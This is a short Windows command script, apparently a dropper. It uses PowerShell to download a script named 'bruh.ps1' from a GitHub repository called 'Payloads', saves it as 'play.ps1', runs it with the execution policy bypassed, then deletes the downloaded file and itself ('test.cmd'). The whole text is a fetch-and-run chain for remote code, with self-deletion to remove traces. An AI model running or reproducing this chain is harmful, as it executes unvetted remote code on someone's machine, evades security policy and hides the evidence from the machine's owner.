powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Alvsch/Payloads/main/bruh.ps1 -OutFile "play.ps1"

powershell -ep bypass ./play.ps1

del play.ps1
del test.cmd
